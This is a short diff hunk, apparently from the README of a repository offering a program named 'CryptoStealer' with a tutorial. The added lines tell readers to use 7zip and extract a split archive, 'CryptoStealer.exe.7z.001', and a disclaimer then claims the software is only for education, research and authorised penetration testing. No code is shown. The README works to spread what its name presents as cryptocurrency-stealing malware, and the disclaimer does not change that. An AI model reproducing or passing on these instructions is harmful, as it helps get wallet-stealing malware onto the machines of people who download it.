@@ -3,6 +3,8 @@
 
 incl. Tutorial!
 
+Please use 7zip and extract only CryptoStealer.exe.7z.001!
+
 ############################################################
 ⚠️ DISCLAIMER – READ CAREFULLY ⚠️
 This software is provided strictly for **educational**, **research**, and **authorized penetration testing** purposes only.
